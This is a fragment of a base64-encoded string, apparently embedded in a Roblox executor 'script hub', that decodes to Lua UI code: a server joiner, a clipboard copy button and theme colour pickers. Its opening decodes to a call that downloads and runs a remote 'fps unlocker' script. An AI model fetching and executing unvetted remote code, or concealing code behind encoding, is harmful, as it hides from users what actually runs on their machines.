Rpb25zdGhlZ29hdC9mcHMtdW5sb2NrZXIvcmVmcy9oZWFkcy9tYWluL2ZwcyUyMHVubG9ja2VyIikpKCkKICAgICAgICAgICAgICAgIFNlbmROb3RpZmljYXRpb24oIkZQUyBVbmxvY2tlciBsb2FkZWQhIiwgMykKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpIC0tIEdpdmUgc2NyaXB0IHRpbWUgdG8gbG9hZAogICAgICAgICAgICAgICAgZm9yIF8sIGd1aSBpbiBpcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJDb3JlR3VpIik6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBndWk6SXNBKCJTY3JlZW5HdWkiKSBhbmQgZ3VpLk5hbWUgfj0gU2NyZWVuR3VpLk5hbWUgYW5kIGd1aS5OYW1lIH49ICJLZXlTeXN0ZW1HVUkiIGFuZCBub3Qgc3RyaW5nLmZpbmQoZ3VpLk5hbWUsICJDeWJlcnB1bmtzIikgYW5kIGd1aS5OYW1lIH49ICJUb242MThVSSIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBmcHNVbmxvY2tlckd1aSA9IGd1aQogICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBpZiBmcHNVbmxvY2tlckd1aSB0aGVuCiAgICAgICAgICAgICAgICAgICAgRnBzVW5sb2NrZXJCdG4uVGV4dCA9ICJUT0dHTEUgRlBTIFVOTE9DS0VSIEdVSSIKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBmcHNVbmxvY2tlckd1aS5FbmFibGVkID0gbm90IGZwc1VubG9ja2VyR3VpLkVuYWJsZWQKICAgICAgICAgICAgICAgIFNlbmROb3RpZmljYXRpb24oIkZQUyBVbmxvY2tlciBHVUkgIiAuLiAoZnBzVW5sb2NrZXJHdWkuRW5hYmxlZCBhbmQgInNob3duIiBvciAiaGlkZGVuIiksIDIpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAogICAgCiAgICBjcmVhdGVTZWN0aW9uKFBhZ2VzLlNob3AsICJTZXJ2ZXIgSm9pbmVyIiwgMzMpCiAgICBjcmVhdGVJbnB1dChQYWdlcy5TaG9wLCAiU2VydmVyIEpvYiBJRCIsICJKb2luSm9iSUQiLCAzNCkKICAgIAogICAgZG8KICAgICAgICBsb2NhbCBKb2luSm9iQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgICAgICBKb2luSm9iQnRuLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICAgICAgSm9pbkpvYkJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAsIDIwLCAyNSkKICAgICAgICBKb2luSm9iQnRuLlRleHQgPSAiSk9JTiBTRVJWRVIgQlkgSUQiCiAgICAgICAgSm9pbkpvYkJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgICAgICBKb2luSm9iQnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgIEpvaW5Kb2JCdG4uVGV4dFNpemUgPSAxMAogICAgICAgIEpvaW5Kb2JCdG4uTGF5b3V0T3JkZXIgPSAzNQogICAgICAgIEpvaW5Kb2JCdG4uUGFyZW50ID0gUGFnZXMuU2hvcAogICAgICAgIAogICAgICAgIGxvY2FsIEpKQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIEpKQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDQpIEpKQ29ybmVyLlBhcmVudCA9IEpvaW5Kb2JCdG4KICAgICAgICAKICAgICAgICBKb2luSm9iQnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCBqb2JJZCA9IENvbmZpZy5Kb2luSm9iSUQKICAgICAgICAgICAgaWYgbm90IGpvYklkIG9yIGpvYklkID09ICIiIHRoZW4gU2VuZE5vdGlmaWNhdGlvbigiUGxlYXNlIGVudGVyIGEgSm9iIElEIiwgMikgcmV0dXJuIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgU2VuZE5vdGlmaWNhdGlvbigiSm9pbmluZyBTZXJ2ZXI6ICIgLi4gam9iSWQsIDMpCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiVGVsZXBvcnRTZXJ2aWNlIik6VGVsZXBvcnRUb1BsYWNlSW5zdGFuY2UoZ2FtZS5QbGFjZUlkLCBqb2JJZCwgcGxheWVyKQogICAgICAgIGVuZCkKICAgIGVuZAoKICAgIGRvCiAgICAgICAgbG9jYWwgU2hvd0lEQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgICAgICBTaG93SURCdG4uU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKICAgICAgICBTaG93SURCdG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwLCAyMCwgMjUpCiAgICAgICAgU2hvd0lEQnRuLlRleHQgPSAiSUQ6ICIgLi4gZ2FtZS5Kb2JJZAogICAgICAgIFNob3dJREJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTUwLCAxNTAsIDE1MCkKICAgICAgICBTaG93SURCdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW0KICAgICAgICBTaG93SURCdG4uVGV4dFNpemUgPSA4CiAgICAgICAgU2hvd0lEQnRuLkxheW91dE9yZGVyID0gMzYKICAgICAgICBTaG93SURCdG4uUGFyZW50ID0gUGFnZXMuU2hvcAogICAgICAgIGxvY2FsIGMgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgYy5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLDQpIGMuUGFyZW50ID0gU2hvd0lEQnRuCiAgICBlbmQKCiAgICBkbwogICAgICAgIGxvY2FsIENvcHlJREJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgQ29weUlEQnRuLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICAgICAgQ29weUlEQnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigzMCwgMzAsIDQwKQogICAgICAgIENvcHlJREJ0bi5UZXh0ID0gIkNPUFkgU0VSVkVSIElEIgogICAgICAgIENvcHlJREJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgICAgICBDb3B5SURCdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICAgICAgQ29weUlEQnRuLlRleHRTaXplID0gMTAKICAgICAgICBDb3B5SURCdG4uTGF5b3V0T3JkZXIgPSAzNwogICAgICAgIENvcHlJREJ0bi5QYXJlbnQgPSBQYWdlcy5TaG9wCiAgICAgICAgbG9jYWwgYyA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBjLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsNCkgYy5QYXJlbnQgPSBDb3B5SURCdG4KICAgICAgICAKICAgICAgICBDb3B5SURCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIHNldGNsaXBib2FyZCB0aGVuIHNldGNsaXBib2FyZChnYW1lLkpvYklkKSBlbmQKICAgICAgICAgICAgU2VuZE5vdGlmaWNhdGlvbigiU2VydmVyIElEIENvcGllZCEiLCAyKQogICAgICAgIGVuZCkKICAgIGVuZAoKICAgIC0tIFNldHRpbmdzIFBhZ2UgQ29udGVudAogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5TZXR0aW5ncywgIlVJIFNldHRpbmdzIiwgMCkKICAgIGNyZWF0ZUtleWJpbmQoUGFnZXMuU2V0dGluZ3MsICJIaWRlIE1lbnUgS2V5IiwgIkhpZGVHdWlLZXkiLCAwLjUpCiAgICAKICAgIGNyZWF0ZVNlY3Rpb24oUGFnZXMuU2V0dGluZ3MsICJUaGVtZSBTZXR0aW5ncyIsIDEpCiAgICAKICAgIGxvY2FsIGZ1bmN0aW9uIFVwZGF0ZVRoZW1lKG5ld0NvbG9yKQogICAgICAgIEN1cnJlbnRUaGVtZUNvbG9yID0gbmV3Q29sb3IKICAgICAgICBUaXRsZS5UZXh0Q29sb3IzID0gbmV3Q29sb3IKICAgICAgICBFeHBhbmRCdXR0b24uVGV4dENvbG9yMyA9IG5ld0NvbG9yCiAgICAgICAgCiAgICAgICAgLS0gVXBkYXRlIFRhYnMgU3Ryb2tlCiAgICAgICAgZm9yIG5hbWUsIGJ0biBpbiBwYWlycyhUYWJCdG5zKSBkbwogICAgICAgICAgICBpZiBQYWdlc1tuYW1lXS5WaXNpYmxlIHRoZW4KICAgICAgICAgICAgICAgIGJ0bi5VSVN0cm9rZS5Db2xvciA9IG5ld0NvbG9yCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIC0tIFVwZGF0ZSBIdWIgQnV0dG9ucwogICAgICAgIGZvciBfLCBidG4gaW4gcGFpcnMoSHViTWVudTpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiBidG46SXNBKCJUZXh0QnV0dG9uIikgdGhlbgogICAgICAgICAgICAgICAgYnRuLlRleHRDb2xvcjMgPSBuZXdDb2xvcgogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBVcGRhdGUgUGF0Y2ggTm90ZXMgQnV0dG9uCiAgICAgICAgaWYgUGF0Y2hOb3Rlc0J0biB0aGVuCiAgICAgICAgICAgIFBhdGNoTm90ZXNCdG4uVGV4dENvbG9yMyA9IG5ld0NvbG9yCiAgICAgICAgICAgIGlmIFBhdGNoTm90ZXNCdG46RmluZEZpcnN0Q2hpbGQoIlVJU3Ryb2tlIikgdGhlbiBQYXRjaE5vdGVzQnRuLlVJU3Ryb2tlLkNvbG9yID0gbmV3Q29sb3IgZW5kCiAgICAgICAgZW5kCiAgICAgICAgaWYgUGF0Y2hOb3Rlc1BhZ2UgdGhlbgogICAgICAgICAgICBmb3IgXywgZiBpbiBwYWlycyhQYXRjaE5vdGVzUGFnZTpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgbG9jYWwgdmwgPSBmOkZpbmRGaXJzdENoaWxkKCJWZXJzaW9uTGFiZWwiKQogICAgICAgICAgICAgICAgaWYgdmwgdGhlbiB2bC5UZXh0Q29sb3IzID0gbmV3Q29sb3IgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIC0tIFVwZGF0ZSBUb2dnbGVzIChBY3RpdmUpCiAgICAgICAgZm9yIGtleSwgYnRuIGluIHBhaXJzKFRvZ2dsZUJ1dHRvbnMpIGRvCiAgICAgICAgICAgIGlmIENvbmZpZ1trZXldIHRoZW4KICAgICAgICAgICAgICAgIGJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gbmV3Q29sb3IKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgLS0gVXBkYXRlIElucHV0cyAmIEtleWJpbmRzIFRleHQKICAgICAgICBmb3IgXywgcGFnZSBpbiBwYWlycyhQYWdlcykgZG8KICAgICAgICAgICAgZm9yIF8sIG9iaiBpbiBwYWlycyhwYWdlOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBvYmo6SXNBKCJUZXh0Qm94IikgdGhlbgogICAgICAgICAgICAgICAgICAgIG9iai5UZXh0Q29sb3IzID0gbmV3Q29sb3IKICAgICAgICAgICAgICAgIGVsc2VpZiBvYmo6SXNBKCJUZXh0QnV0dG9uIikgYW5kIG9iai5QYXJlbnQ6RmluZEZpcnN0Q2hpbGQoIlVJU3Ryb2tlIikgYW5kIG9iai5UZXh0IH49ICIiIGFuZCBvYmouTmFtZSB+PSAiRXhwYW5kQnV0dG9uIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgLS0gSGV1cmlzdGljIHRvIGZpbmQgS2V5YmluZC9JbnB1dCBidXR0b25zIChub3QgdG9nZ2xlcyB3aGljaCBoYXZlIGVtcHR5IHRleHQpCiAgICAgICAgICAgICAgICAgICAgb2JqLlRleHRDb2xvcjMgPSBuZXdDb2xvcgogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCgogICAgZG8KICAgIGxvY2FsIFRoZW1lQ29udGFpbmVyID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICBUaGVtZUNvbnRhaW5lci5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDQwKQogICAgVGhlbWVDb250YWluZXIuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIFRoZW1lQ29udGFpbmVyLkxheW91dE9yZGVyID0gMgogICAgVGhlbWVDb250YWluZXIuUGFyZW50ID0gUGFnZXMuU2V0dGluZ3MKICAgIAogICAgbG9jYWwgVGhlbWVMYXlvdXQgPSBJbnN0YW5jZS5uZXcoIlVJTGlzdExheW91dCIpCiAgICBUaGVtZUxheW91dC5GaWxsRGlyZWN0aW9uID0gRW51bS5GaWxsRGlyZWN0aW9uLkhvcml6b250YWwKICAgIFRoZW1lTGF5b3V0LlBhZGRpbmcgPSBVRGltLm5ldygwLCA1KQogICAgVGhlbWVMYXlvdXQuUGFyZW50ID0gVGhlbWVDb250YWluZXIKICAgIAogICAgbG9jYWwgZnVuY3Rpb24gY3JlYXRlQ29sb3JCdG4oY29sb3IsIG5hbWUpCiAgICAgICAgbG9jYWwgYnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgICAgICBidG4uU2l6ZSA9IFVEaW0yLm5ldygwLCAzMCwgMCwgMzApCiAgICAgICAgYnRuLkJhY2tncm91bmRDb2xvcjMgPSBjb2xvcgogICAgICAgIGJ0bi5UZXh0ID0gIiIKICAgICAgICBidG4uUGFyZW50ID0gVGhlbWVDb250YWluZXIKICAgICAgICAKICAgICAgICBsb2NhbCBjb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKICAgICAgICBjb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMSwgMCkKICAgICAgICBjb3JuZXIuUGFyZW50ID0gYnRuCiAgICAgICAgCiAgICAgICAgbG9jYWwgc3Ryb2tlID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIpCiAgICAgICAgc3Ryb2tlLkNvbG9yID0gQ29sb3IzLmZyb21SR0IoNTAsIDUwLCA2MCkKICAgICAgICBzdHJva2UuVGhpY2tuZXNzID0gMQogICAgICAgIHN0cm9rZS5QYXJlbnQgPSBidG4KICAgICAgICAKICAgICAgICBsb2NhbCB0aXAgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICAgICAgdGlwLlRleHQgPSBuYW1lCiAgICAgICAgdGlwLlNpemUgPSBVRGltMi5uZXcoMCwgMCwgMCwgMTUpCiAgICAgICAgdGlwLkF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWAogICAgICAgIHRpcC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIC0wLjYsIDApCiAgICAgICAgdGlwLkFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMC41LCAxKQogICAgICAgIHRpcC5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMzAsIDMwLCA0MCkKICAgICAgICB0aXAuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgdGlwLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtCiAgICAgICAgdGlwLlRleHRTaXplID0gOAogICAgICAgIHRpcC5WaXNpYmxlID0gZmFsc2UKICAgICAgICB0aXAuWkluZGV4ID0gMTAKICAgICAgICB0aXAuUGFyZW50ID0gYnRuCiAgICAgICAgbG9jYWwgdENvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSB0Q29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDMpIHRDb3JuZXIuUGFyZW50ID0gdGlwCiAgICAgICAgbG9jYWwgdFBhZCA9IEluc3RhbmNlLm5ldygiVUlQYWRkaW5nIikgdFBhZC5QYWRkaW5nTGVmdCA9IFVEaW0ubmV3KDAsIDQpIHRQYWQuUGFkZGluZ1JpZ2h0ID0gVURpbS5uZXcoMCwgNCkgdFBhZC5QYXJlbnQgPSB0aXAKICAgICAgICAKICAgICAgICBidG4uTW91c2VFbnRlcjpDb25uZWN0KGZ1bmN0aW9uKCkgdGlwLlZpc2libGUgPSB0cnVlIGVuZCkKICAgICAgICBidG4uTW91c2VMZWF2ZTpDb25uZWN0KGZ1bmN0aW9uKCkgdGlwLlZpc2libGUgPSBmYWxzZSBlbmQpCiAgICAgICAgCiAgICAgICAgYnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBVcGRhdGVUaGVtZShjb2xvcikKICAgICAgICBlbmQpCiAgICBlbmQKICAgIAogICAgY3JlYXRlQ29sb3JCdG4oQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDApLCAiWWVsbG93IikKICAgIGNyZWF0ZUNvbG9yQnRuKENvbG9yMy5mcm9tUkdCKDE3MCwgMCwgMjU1KSwgIlB1cnBsZSIpCiAgICBjcmVhdGVDb2xvckJ0bihDb2xvcjMuZnJvbVJHQigwLCAyNTUsIDE1MCksICJUdXJxdW9pc2UiKQogICAgY3JlYXRlQ29sb3JCdG4oQ29sb3IzLmZyb21SR0IoMjU1LCA1MCwgNTApLCAiUmVkIikKICAgIGNyZWF0ZUNvbG9yQnRuKENvbG9yMy5mcm9tUkdCKDAsIDE1MCwgMjU1KSwgIkJsdWUiKQogICAgY3JlYXRlQ29sb3JCdG4oQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSksICJXaGl0ZSIpCiAgICBlbmQKICAgIAogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5TZXR0aW5ncywgIlBhbmVsIENvbG9yIiwgMi4xKQogICAgCiAgICBkbwogICAgICAgIGxvY2FsIFBhbmVsQ29sb3JGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgICAgIFBhbmVsQ29sb3JGcmFtZS5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDQwKQogICAgICAgIFBhbmVsQ29sb3JGcmFtZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgIFBhbmVsQ29sb3JGcmFtZS5MYXlvdXRPcmRlciA9IDIuMgogICAgICAgIFBhbmVsQ29sb3JGcmFtZS5QYXJlbnQgPSBQYWdlcy5TZXR0aW5ncwogICAgICAgIAogICAgICAgIGxvY2FsIFBhbmVsQ29sb3JMYXlvdXQgPSBJbnN0YW5jZS5uZXcoIlVJR3JpZExheW91dCIpCiAgICAgICAgUGFuZWxDb2xvckxheW91dC5DZWxsU2l6ZSA9IFVEaW0yLm5ldygwLCAyNSwgMCwgMjUpCiAgICAgICAgUGFuZWxDb2xvckxheW91dC5DZWxsUGFkZGluZyA9IFVEaW0yLm5ldygwLCA1LCAwLCA1KQogICAgICAgIFBhbmVsQ29sb3JMYXlvdXQuUGFyZW50ID0gUGFuZWxDb2xvckZyYW1lCiAgICAgICAgCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gY3JlYXRlUGFuZWxDb2xvckJ0bihjb2xvciwgbmFtZSkKICAgICAgICAgICAgbG9jYWwgYnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgICAgICAgICAgYnRuLlRleHQgPSAiIgogICAgICAgICAgICBidG4uQmFja2dyb3VuZENvbG9yMyA9IGNvbG9yCiAgICAgICAgICAgIGJ0bi5QYXJlbnQgPSBQYW5lbENvbG9yRnJhbWUKICAgICAgICAgICAgbG9jYWwgYyA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBjLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDEsMCkgYy5QYXJlbnQgPSBidG4KICAgICAgICAgICAgbG9jYWwgcyA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiKSBzLkNvbG9yID0gQ29sb3IzLmZyb21SR0IoNjAsNjAsNjApIHMuVGhpY2tuZXNzID0gMSBzLlBhcmVudCA9IGJ0bgogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgdGlwID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKSB0aXAuVGV4dCA9IG5hbWUgdGlwLlNpemUgPSBVRGltMi5uZXcoMCwwLDAsMTUpIHRpcC5BdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlggdGlwLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwwLC0wLjYsMCkgdGlwLkFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMC41LDEpIHRpcC5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMzAsMzAsNDApIHRpcC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LDI1NSwyNTUpIHRpcC5Gb250ID0gRW51bS5Gb250LkdvdGhhbSB0aXAuVGV4dFNpemUgPSA4IHRpcC5WaXNpYmxlID0gZmFsc2UgdGlwLlpJbmRleCA9IDEwIHRpcC5QYXJlbnQgPSBidG4KICAgICAgICAgICAgbG9jYWwgdENvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSB0Q29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsMykgdENvcm5lci5QYXJlbnQgPSB0aXAKICAgICAgICAgICAgbG9jYWwgdFBhZCA9IEluc3RhbmNlLm5ldygiVUlQYWRkaW5nIikgdFBhZC5QYWRkaW5nTGVmdCA9IFVEaW0ubmV3KDAsNCkgdFBhZC5QYWRkaW5nUmlnaHQgPSBVRGltLm5ldygwLDQpIHRQYWQuUGFyZW50ID0gdGlwCiAgICAgICAgICAgIGJ0bi5Nb3VzZUVudGVyOkNvbm5lY3QoZnVuY3Rpb24oKSB0aXAuVmlzaWJsZSA9IHRydWUgZW5kKQogICAgICAgICAgICBidG4uTW91c2VMZWF2ZTpDb25uZWN0KGZ1bmN0aW9uKCkgdGlwLlZpc2libGUgPSBmYWxzZSBlbmQpCiAgICAgICAgICAgIAogICAgICAgICAgICBidG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBNYWluRnJhbWUuQmFja2dyb3VuZENvbG9yMyA9IGNvbG9yCiAgICAgICAgICAgICAgICBSaWdodFBhbmVsLkJhY2tncm91bmRDb2xvcjMgPSBjb2xvcgogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgY3JlYXRlUGFuZWxDb2xvckJ0bihDb2xvcjMuZnJvbVJHQigxNSwgMTUsIDIwKSwgIkRlZmF1bHQiKQogICAgICAgIGNyZWF0ZVBhbmVsQ29sb3JCdG4oQ29sb3IzLmZyb21SR0IoMCwgMCwgMCksICJCbGFjayIpCiAgICAgICAgY3JlYXRlUGFuZWxDb2xvckJ0bihDb2xvcjMuZnJvbVJHQigyNSwgMjUsIDMwKSwgIkdyYXkiKQogICAgICAgIGNyZWF0ZVBhbmVsQ29sb3JCdG4oQ29sb3IzLmZyb21SR0IoMTAsIDEwLCAyNSksICJOYXZ5IikKICAgICAgICBjcmVhdGVQYW5lbENvbG9yQnRuKENvbG9yMy5mcm9tUkdCKDI1LCAxMCwgMTApLCAiUmVkaXNoIikKICAgICAgICBjcmVhdGVQYW5lbENvbG9yQnRuKENvbG9yMy5mcm9tUkdCKDEwLCAyNSwgMTApLCAiR3JlZW5pc2giKQogICAgICAgIGNyZWF0ZVBhbmVsQ29sb3JCdG4oQ29sb3IzLmZyb21SR0IoMjUsIDEwLCAyNSksICJQdXJwbGVpc2giKQogICAgICAgIGNyZWF0ZVBhbmVsQ29sb3JCdG4oQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSksICJGbGFzaGJhbmciKQogICAgICAgIGNyZWF0ZVBhbmVsQ29sb3JCdG4oQ29sb3IzLmZyb21SR0IoNDAsIDAsIDApLCAiUmVkIikKICAgICAgICBjcmVhdGVQYW5lbENvbG9yQnRuKENvbG9yMy5mcm9tUkdCKDAsIDAsIDQwKSwgIkJsdWUiKQogICAgICAgIGNyZWF0ZVBhbmVsQ29sb3JCdG4oQ29sb3IzLmZyb21SR0IoMCwgNDAsIDApLCAiR3JlZW4iKQogICAgICAgIGNyZWF0ZVBhbmVsQ29sb3JCdG4oQ29sb3IzLmZyb21SR0IoNDAsIDIwLCAwKSwgIk9yYW5nZSIpCiAgICAgICAgY3JlYXRlUGFuZWxDb2xvckJ0bihDb2xvcjMuZnJvbVJHQigyMCwgMCwgNDApLCAiUHVycGxlIikKICAgICAgICBjcmVhdGVQYW5lbENvbG9yQnRuKENvbG9yMy5mcm9tUkdCKDAsIDQwLCA0MCksICJUZWFsIikKICAgIGVuZAogICAgCiAgICBjcmVhdGVTZWN0" .. "aW9uKFBhZ2VzLlNldHRpbmdzLCAiUGFuZWwgQ29sb3IiLCAyLjEpCiAgICAKICAgIGRvCiAgICAgICAgbG9jYWwgUGFuZWxDb2xvckZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICAgICAgUGFuZWxDb2xvckZyYW1lLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgNjApCiAgICAgICAgUGFuZWxDb2xvckZyYW1lLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgUGFuZWxDb2xvckZyYW1lLkxheW91dE9yZGVyID0gMi4yCiAgICAgICAgUGFuZWxDb2xvckZyYW1lLlBhcmVudCA9IFBhZ2VzLlNldHRpbmdzCiAgICAgICAgCiAgICAgICAgbG9jYWwgUGFuZWxDb2xvckxheW91dCA9IEluc3RhbmNlLm5ldygiVUlHcmlkTGF5b3V0IikKICAgICAgICBQYW5lbENvbG9yTGF5b3V0LkNlbGxTaXplID0gVURpbTIubmV3KDAsIDI1LCAwLCAyNSkKICAgICAgICBQYW5lbENvbG9yTGF5b3V0LkNlbGxQYWRkaW5nID0gVURpbTIubmV3KDAsIDUsIDAsIDUpCiAgICAgICAgUGFuZWxDb2xvckxheW91dC5QYXJlbnQgPSBQYW5lbENvbG9yRnJhbWUKICAgICAgICAKICAgICAgICBsb2NhbCBmdW5jdGlvbiBjcmVhdGVQYW5lbENvbG9yQnRuKGNvbG9yLCBuYW1lKQogICAgICAgICAgICBsb2NhbCBidG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgICAgICAgICBidG4uVGV4dCA9ICIiCiAgICAgICAgICAgIGJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gY29sb3IKICAgICAgICAgICAgYnRuLlBhcmVudCA9IFBhbmVsQ29sb3JGcmFtZQogICAgICAgICAgICBsb2NhbCBjID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIGMuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMSwwKSBjLlBhcmVudCA9IGJ0bgogICAgICAgICAgICBsb2NhbCBzID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIpIHMuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQig2MCw2MCw2MCkgcy5UaGlja25lc3MgPSAxIHMuUGFyZW50ID0gYnRuCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCB0aXAgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpIHRpcC5UZXh0ID0gbmFtZSB0aXAuU2l6ZSA9IFVEaW0yLm5ldygwLDAsMCwxNSkgdGlwLkF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWCB0aXAuUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LDAsLTAuNiwwKSB0aXAuQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygwLjUsMSkgdGlwLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigzMCwzMCw0MCkgdGlwLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsMjU1LDI1NSkgdGlwLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtIHRpcC5UZXh0U2l6ZSA9IDggdGlwLlZpc2libGUgPSBmYWxzZSB0aXAuWkluZGV4ID0gMTAgdGlwLlBhcmVudCA9IGJ0bgogICAgICAgICAgICBsb2NhbCB0Q29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIHRDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwzKSB0Q29ybmVyLlBhcmVudCA9IHRpcAogICAgICAgICAgICBsb2NhbCB0UGFkID0gSW5zdGFuY2UubmV3KCJVSVBhZGRpbmciKSB0UGFkLlBhZGRpbmdMZWZ0ID0gVURpbS5uZXcoMCw0KSB0UGFkLlBhZGRpbmdSaWdodCA9IFVEaW0ubmV3KDAsNCkgdFBhZC5QYXJlbnQ